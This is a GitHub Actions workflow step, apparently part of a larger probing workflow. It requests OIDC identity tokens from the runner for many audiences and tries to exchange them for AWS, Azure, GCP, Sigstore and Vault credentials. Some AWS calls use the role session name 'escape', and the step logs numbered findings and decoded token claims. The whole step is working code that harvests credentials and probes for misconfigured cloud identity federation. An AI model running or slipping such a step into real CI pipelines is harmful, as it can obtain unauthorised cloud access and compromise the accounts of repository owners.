      - name: "6 OIDC Token Exchange (cloud providers)"
        run: |
          set +e
          echo "=== OIDC TOKEN EXCHANGE ==="
          OT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
          if [ -z "$OT" ]; then echo "OIDC not available"; exit 0; fi
          echo "F00 OIDC request URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:0:60}..."
          echo ""
          echo "--- AWS STS exchange ---"
          JWT_AWS=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" \
            -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
          if [ -n "$JWT_AWS" ]; then
            echo "F01 AWS JWT obtained (${#JWT_AWS} chars)"
            R=$(curl -s "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&RoleArn=arn:aws:iam::012345678901:role/GitHubActions&RoleSessionName=escape&WebIdentityToken=${JWT_AWS}&Version=2011-06-15" 2>/dev/null)
            echo "F01 AWS STS response: $(echo "$R" | head -c 200)"
            R2=$(curl -s -X POST "https://sts.amazonaws.com/" \
              -d "Action=AssumeRoleWithWebIdentity&WebIdentityToken=${JWT_AWS}&RoleSessionName=test&Version=2011-06-15" 2>/dev/null)
            echo "F01b AWS STS no-role: $(echo "$R2" | head -c 200)"
          fi
          echo ""
          echo "--- Azure AD exchange ---"
          JWT_AZ=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
          if [ -n "$JWT_AZ" ]; then
            echo "F02 Azure JWT obtained (${#JWT_AZ} chars)"
            R=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
              -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=${JWT_AZ}&client_id=test&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" 2>/dev/null)
            echo "F02 Azure AD response: $(echo "$R" | head -c 200)"
            R2=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
              -d "grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${JWT_AZ}&client_id=test&scope=https://graph.microsoft.com/.default" 2>/dev/null)
            echo "F02b Azure client_creds: $(echo "$R2" | head -c 200)"
          fi
          echo ""
          echo "--- GCP STS exchange ---"
          JWT_GCP=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://iam.googleapis.com" \
            -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
          if [ -n "$JWT_GCP" ]; then
            echo "F03 GCP JWT obtained (${#JWT_GCP} chars)"
            R=$(curl -s -X POST "https://sts.googleapis.com/v1/token" \
              -H "Content-Type: application/json" \
              -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\",\"subject_token\":\"${JWT_GCP}\",\"audience\":\"//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github-pool/providers/github\"}" 2>/dev/null)
            echo "F03 GCP STS response: $(echo "$R" | head -c 200)"
          fi
          echo ""
          echo "--- Sigstore/Fulcio ---"
          JWT_SIG=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" \
            -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
          if [ -n "$JWT_SIG" ]; then
            echo "F04 sigstore JWT obtained"
            R=$(curl -s -X POST "https://fulcio.sigstore.dev/api/v2/signingCertificate" \
              -H "Authorization: Bearer $JWT_SIG" -H "Content-Type: application/json" \
              -d '{"credentials":{"oidcIdentityToken":"'"$JWT_SIG"'"}}' 2>/dev/null)
            echo "F04 fulcio response: $(echo "$R" | head -c 200)"
          fi
          echo ""
          echo "--- HashiCorp Vault ---"
          JWT_V=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=vault" \
            -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
          echo "F05 vault JWT: $([ -n "$JWT_V" ] && echo obtained || echo failed)"
          echo ""
          echo "--- Custom audiences ---"
          for AUD in "https://github.com" "https://api.github.com" "github-actions" \
            "https://vstoken.actions.githubusercontent.com" "pipelines" \
            "https://token.actions.githubusercontent.com" "self"; do
            JWT=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" \
              -H "Authorization: bearer $OT" | jq -r '.value // empty' || true)
            if [ -n "$JWT" ]; then
              CLAIMS=$(echo "$JWT" | cut -d. -f2 | awk '{n=length($0)%4;if(n==2)$0=$0"==";if(n==3)$0=$0"=";print}' | base64 -d 2>/dev/null | jq -r '{aud,sub,iss}' 2>/dev/null)
              echo "F06 aud=${AUD}: ${CLAIMS}"
            else
              echo "F06 aud=${AUD}: FAILED"
            fi
          done

